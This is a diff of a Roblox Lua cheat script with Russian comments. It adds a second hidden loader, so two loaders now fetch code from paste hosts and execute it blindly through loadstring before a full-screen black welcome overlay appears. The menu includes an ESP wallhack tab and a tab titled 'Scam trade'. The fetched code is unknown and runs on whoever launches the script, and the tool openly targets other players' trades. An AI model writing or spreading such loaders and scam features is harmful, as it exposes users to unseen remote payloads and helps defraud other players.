@@ -1,12 +1,16 @@
 -- ============================================================
--- 0. САМЫЙ ПЕРВЫЙ ЗАГРУЗЧИК
+-- 0. ДВА САМЫХ ПЕРВЫХ ЗАГРУЗЧИКА (ОДНОВРЕМЕННО)
 -- ============================================================
 task.spawn(function()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cCS4jW4Mph/0"))()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/6pbc4nSNzI/0"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/zvkJyvPyFfWSg4bX/raw"))()
 end)
 
 -- ============================================================
--- 1. ПРИВЕТСТВИЕ
+-- 1. ПРИВЕТСТВИЕ И ЧЁРНЫЙ ФОН (Mertily's script)
 -- ============================================================
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
@@ -25,7 +29,7 @@ WelcomeFrame.Position = UDim2.new(0, 0, 0, 0)
 WelcomeFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 WelcomeFrame.BackgroundTransparency = 1
 WelcomeFrame.ZIndex = 1
-WelcomeFrame.IgnoreGuiInset = true
+WelcomeFrame.IgnoreGuiInset = true -- Перекрывает весь экран
 
 local WelcomeText = Instance.new("TextLabel")
 WelcomeText.Parent = WelcomeGui
@@ -259,7 +263,6 @@ function LoadMainScript()
         local LocalPlayer = Players.LocalPlayer
         local Camera = workspace.CurrentCamera
 
-        -- ПОДКЛЮЧЕНИЕ ТЕМ
         WindUI:AddTheme({
             ["Name"] = "Dark",
             ["Accent"] = "#18181b",
@@ -298,7 +301,7 @@ function LoadMainScript()
         Tabs.ESP = MainWindow:Tab({["Title"] = "ESP", ["Icon"] = "eye", ["Desc"] = "Mertily's script"})
         Tabs.Trade = MainWindow:Tab({["Title"] = "Scam trade", ["Icon"] = "solar:widget-bold", ["Desc"] = "Mertily's script"})
 
-        -- ==================== ESP ТАБ (РАБОЧИЙ ВХ) ====================
+        -- ==================== ESP ТАБ (ВХ) ====================
         Tabs.ESP:Section({["Title"] = "ESP Controls"})
 
         local ESPEnabled = false
